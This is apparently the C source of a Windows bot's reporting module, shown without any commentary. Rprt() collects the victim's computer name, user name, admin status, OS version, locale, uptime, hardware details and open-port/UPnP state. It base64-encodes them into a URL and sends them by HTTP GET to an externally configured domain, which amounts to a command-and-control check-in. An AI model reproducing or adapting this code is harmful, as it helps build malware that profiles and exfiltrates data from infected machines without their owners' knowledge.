#include <winsock2.h>
#include <windows.h>
#include <winhttp.h>
#include <shellapi.h>
#include <stdlib.h>
#include <stdio.h>
#include "global.h"
#include "report.h"
#include "base64.h"

extern LPCWSTR  url_domain;
extern char		url_path[];
extern char		ver[];

static DWORD WINAPI GetIpByHostname(char *host)
{
    DWORD ret = 0;
    struct hostent * hp = gethostbyname(host);
    if (!hp) ret = inet_addr(host);
    if ((!hp)&&(ret == INADDR_NONE)) return 0;
    if (hp != NULL) memcpy((void*)&ret, hp->h_addr,hp->h_length);
    return ret;
}

BOOL doRprt(LPCWSTR szReportData)
{
    BOOL  bResults = FALSE;
    HINTERNET hSession = NULL,
              hConnect = NULL,
              hRequest = NULL;

    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(  L"", 
                             WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                             WINHTTP_NO_PROXY_NAME, 
                             WINHTTP_NO_PROXY_BYPASS, 0);

    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect( hSession, url_domain,
                                  INTERNET_DEFAULT_HTTP_PORT, 0);

    // Create an HTTP Request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest( hConnect, L"GET", 
                                       szReportData, 
                                       NULL, WINHTTP_NO_REFERER, 
                                       WINHTTP_DEFAULT_ACCEPT_TYPES,
                                       0);

    // Send a Request.
    if (hRequest) 
        bResults = WinHttpSendRequest( hRequest, 
                                       WINHTTP_NO_ADDITIONAL_HEADERS,
                                       0, WINHTTP_NO_REQUEST_DATA, 0, 
                                       0, 0);

    // Report any errors.
    if (!bResults)
        return FALSE;

    // Close any open handles.
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

	return TRUE;
}
int Rprt(int Port,int Private, int UpNP, info_t* Info)
{
	Base64 base64;
	char szVer[18];
	char szPort[18];
	char szPrivate[2];
	char szUpNP[2];
	char szOSver[18];
	char szLocale[18];
	char szComputerName[MAX_COMPUTERNAME_LENGTH + 1];
    char szUserName[UNLEN + 1];
	char szurlPath[MAX_PATH];
	char szUpTime[18];
	char szRam[8];
	char szProcSpeed[8];
	char szProcs[8];
	char szIsAdmin[2];
	char buffer[MAX_PATH] = {0};
	
	sprintf(szVer, "%s", ver);
	sprintf(szPort,"%d", Port);
	sprintf(szPrivate, "%d", Private);
	sprintf(szUpNP, "%d", UpNP);
	sprintf(szOSver, "%d.%d.%d", Info->MajorVersion, Info->MinorVersion, Info->ServicePack);
	sprintf(szLocale, "%s", Info->Country);
	sprintf(szComputerName, "%s", Info->ComputerName);
	sprintf(szUserName, "%s", Info->UserName);
	sprintf(szUpTime, "%d", Info->Uptime);
	sprintf(szRam, "%d", Info->Ram);
	sprintf(szProcSpeed, "%d", Info->ProcSpeed);
	sprintf(szProcs, "%d", Info->Procs);
	sprintf(szIsAdmin, "%d", int(Info->IsAdmin));
	sprintf(szurlPath, "%s", url_path);

	// Build URL
	strcat(buffer,szVer);
	strcat(buffer,"|");
	strcat(buffer,szPort);
	strcat(buffer,"|");
	strcat(buffer,szPrivate);
	strcat(buffer,"|");
	strcat(buffer,szUpNP);
	strcat(buffer,"|");
	strcat(buffer,szOSver);
	strcat(buffer,"|");
	strcat(buffer,szLocale);
	strcat(buffer,"|");
	strcat(buffer,szComputerName);
	strcat(buffer,"|");
	strcat(buffer,szUserName);
	strcat(buffer,"|");
	strcat(buffer,szUpTime);
	strcat(buffer,"|");
	strcat(buffer,szRam);
	strcat(buffer,"|");
	strcat(buffer,szProcSpeed);
	strcat(buffer,"|");
	strcat(buffer,szProcs);
	strcat(buffer,"|");
	strcat(buffer,szIsAdmin);
	strcat(szurlPath,base64.encode(buffer));
	
	wchar_t reportData[sizeof(szurlPath)+1];
	mbstowcs(reportData, szurlPath, sizeof(szurlPath)+1);

	Sleep(100);

    if(doRprt(reportData))
		return TRUE;
	else
		return FALSE;
}
